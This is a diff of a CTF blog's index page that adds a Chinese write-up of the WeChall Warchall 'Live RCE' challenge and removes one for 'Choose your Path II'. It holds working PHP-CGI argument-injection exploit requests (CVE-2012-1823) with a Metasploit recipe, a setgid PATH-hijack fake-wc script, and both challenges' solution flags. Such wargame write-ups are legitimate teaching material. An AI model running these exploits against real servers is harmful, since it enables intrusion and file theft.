@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">349</span>
+          <span class="site-state-item-count">350</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">212</span>
+        <span class="site-state-item-count">214</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,174 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/WeChall/wechall-warchall-live-rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/WeChall/wechall-warchall-live-rce/" class="post-title-link" itemprop="url">WeChall - Warchall - Live RCE</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-26 16:19:57 / Modified: 16:19:58" itemprop="dateCreated datePublished" datetime="2026-06-26T16:19:57+08:00">2026-06-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/WeChall/wechall-warchall-live-rce/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="WeChall/wechall-warchall-live-rce/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Warchall 服务器上的 Live RCE 题目，目标是证明对
+<code>rce.warchall.net</code> 的可控命令执行，并读取 challenge
+solution。</p>
+<p>WeChall 页面只给入口和提交框，真正的靶机在：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rce.warchall.net/index.php</span><br></pre></td></tr></table></figure>
+<h3 id="recon">Recon</h3>
+<p>先看源码。PHP-CGI 模式下 <code>-s</code>
+参数会泄露源码而不是高亮输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://rce.warchall.net/index.php?-s&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>页面源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) ? (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Live RCE [Warchall]&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Live RCE!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Hello <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>; <span class="meta">?&gt;</span>!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Here are your <span class="variable">$_SERVER</span> vars:&lt;/p&gt;</span><br><span class="line">&lt;pre&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>); <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>两个关键发现：</p>
+<ol type="1">
+<li><code>-s</code> 生效了——说明 URL 参数直接传给了 PHP-CGI
+解释器，而不是被 Apache 吞掉。</li>
+<li>源码里 <code>require '../config.php'</code>，solution
+大概率藏在那里。</li>
+</ol>
+<h3 id="vulnerability-php-cgi-argument-injection">Vulnerability: PHP-CGI
+Argument Injection</h3>
+<p>当 PHP 以 CGI 模式运行时（<code>php-cgi</code>），命令行参数可以通过
+URL query string 传递。这不是 bug，是 CGI 协议的设计——query string
+本来就是传给程序的。PHP-CGI 会解析以 <code>-</code>
+开头的参数，就像命令行 <code>php -d key=value -s file.php</code>
+一样。</p>
+<p>CVE-2012-1823 记录了这个漏洞。受影响的是所有以 CGI/FastCGI
+模式运行且没有做参数过滤的 PHP 部署。</p>
+<p>核心 payload 参数：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-s</code></td>
+<td>泄露源码（syntax highlight）</td>
+</tr>
+<tr>
+<td><code>-d key=value</code></td>
+<td>覆盖 php.ini 配置项</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>不加载 php.ini</td>
+</tr>
+</tbody>
+</table>
+<h3 id="exploit">Exploit</h3>
+<h4 id="方法一phpinput纯-http不需要-ssh">方法一：php://input（纯
+HTTP，不需要 SSH）</h4>
+<p>通过 <code>-d</code> 覆盖两个关键配置：</p>
+<ul>
+<li><code>allow_url_include=On</code> — 允许 include 远程/流包装器</li>
+<li><code>auto_prepend_file=php://input</code> — 在每个 PHP 文件执行前先
+include 请求体</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -X POST \</span><br><span class="line">  <span class="string">&#x27;https://rce.warchall.net/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YOU WIN!</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;ICANHAZRCE&#x27;, &#x27;StrongGard_6_3&#x27;);</span><br><span class="line">return ICANHAZRCE;</span><br><span class="line">?&gt;</span><br><span class="line">YOU WIN!</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><code>YOU WIN!</code> 是 <code>config.php</code> 里预设的标志。后面的
+HTML 是正常页面渲染——因为 <code>auto_prepend_file</code> 在 index.php
+执行前就跑了我们的 payload。</p>
+<h4 id="方法二ssh-auto_prepend_file">方法二：SSH +
+auto_prepend_file</h4>
+<p>如果有 Warchall SSH 访问权限，可以先在服务器上放一个 PHP 文件，然后用
+<code>auto_prepend_file</code> 指向它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH 上去写文件</span></span><br><span class="line">$ ssh -p 19198 user@warchall.net</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span> &gt; /var/tmp/s.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后触发</span></span><br><span class="line">$ curl <span class="string">&#x27;https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>结果要「查看源码」才能看到——因为 PHP 输出混在 HTML
+里，浏览器渲染后不可见。</p>
+<h4 id="方法三metasploit">方法三：Metasploit</h4>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line">set RHOSTS rce.warchall.net</span><br><span class="line">set TARGETURI /index.php</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">StrongGard_6_3</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1536,171 +1704,6 @@ Wins》（又名 The Final Option）</li>
 </ol>
 <p>CSDb 技术信息验证页: https://csdb.dk/sid/?id=14365</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TheLastNinja,GreatGianaSisters,WhoDaresWins</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-choose-your-path-ii/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-choose-your-path-ii/" class="post-title-link" itemprop="url">WeChall - Choose your Path II</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-14 17:28:29 / Modified: 17:28:30" itemprop="dateCreated datePublished" datetime="2026-06-14T17:28:29+08:00">2026-06-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-choose-your-path-ii/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-choose-your-path-ii/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This is the level11 mini challenge found in
-<code>/home/level/11_choose_your_path2/</code> on the warchall box.</p>
-</blockquote>
-<p>Choose your Path 续集。同样是一个 C 程序 <code>charp2</code>，用
-<code>popen()</code> 执行 <code>wc</code> 统计文件行数和字符数。</p>
-<p>与 level10 <code>charp</code> 的区别：</p>
-<table>
-<colgroup>
-<col style="width: 11%" />
-<col style="width: 29%" />
-<col style="width: 58%" />
-</colgroup>
-<thead>
-<tr>
-<th>特性</th>
-<th>charp (level10)</th>
-<th>charp2 (level11)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>wc 路径</td>
-<td>硬编码 <code>/usr/bin/wc</code></td>
-<td>直接用 <code>wc</code>（依赖 PATH）</td>
-</tr>
-<tr>
-<td>参数包裹</td>
-<td>直接拼接</td>
-<td>单引号包裹 <code>'%s'</code></td>
-</tr>
-<tr>
-<td>引号转义</td>
-<td>无</td>
-<td><code>escape_single_quotes()</code> 将 <code>'</code> →
-<code>'\''</code></td>
-</tr>
-</tbody>
-</table>
-<p>Level 10 是靠 command injection（<code>popen()</code> 不处理 shell
-metachar），而 level 11 加上了单引号包裹和转义函数，所以 command
-injection 被堵了。</p>
-<p>但新的漏洞是：<strong><code>wc</code>
-没有指定绝对路径</strong>，可以通过 <code>PATH</code> 环境变量劫持。</p>
-<h3 id="solution">Solution</h3>
-<p><code>charp2</code> 是 setgid level11 的程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /home/level/11_choose_your_path2/</span><br><span class="line">-rwxr-sr-x  1 level11 level11 16440 ... charp2      # setgid!</span><br><span class="line">-rw-r-----  1 root    level11   297 ... solution.txt  # 只有 level11 可读</span><br></pre></td></tr></table></figure>
-<p><code>solution.txt</code> 只允许 level11 group 读取，但
-<code>charp2</code> 执行时有效 GID 变成 level11，所以可以读取。</p>
-<p>攻击步骤：</p>
-<ol type="1">
-<li>创建一个 fake <code>wc</code> 脚本</li>
-<li>把它的目录加到 <code>PATH</code> 最前面</li>
-<li>运行 <code>charp2</code>，它通过 <code>popen("wc -l '...'")</code>
-执行时，会找到我们的 fake <code>wc</code></li>
-<li>fake <code>wc</code> 继承 <code>charp2</code> 的 setgid
-权限（<code>popen</code> → <code>/bin/sh -c</code> →
-<code>exec</code>，dash 不会丢弃 setgid），能读取
-<code>solution.txt</code></li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 fake wc</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/mypayload</span><br><span class="line"><span class="built_in">cat</span> &gt; ~/mypayload/wc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /home/level/11_choose_your_path2/solution.txt 1&gt;&amp;2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1 5&quot;</span>  <span class="comment"># 让 charp2 能正常解析数字</span></span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x ~/mypayload/wc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line"><span class="built_in">cd</span> /home/level/11_choose_your_path2</span><br><span class="line">PATH=~/mypayload:<span class="variable">$PATH</span> ./charp2 solution.txt</span><br></pre></td></tr></table></figure>
-<p>原理：</p>
-<ul>
-<li><code>popen("wc -l 'solution.txt'", "r")</code> →
-<code>/bin/sh -c "wc -l 'solution.txt'"</code></li>
-<li><code>/bin/sh</code> is <strong>dash</strong>（不是 bash），dash
-<em>不</em>会丢弃继承的 setgid</li>
-<li>dash 通过 PATH 找到我们的 <code>~/mypayload/wc</code>，执行时仍保有
-<code>charp2</code> 的 EGID=level11</li>
-<li>所以 fake <code>wc</code> 可以 <code>cat solution.txt</code></li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">CodingIsDamnHard3</span></span>
 
       
     </div>
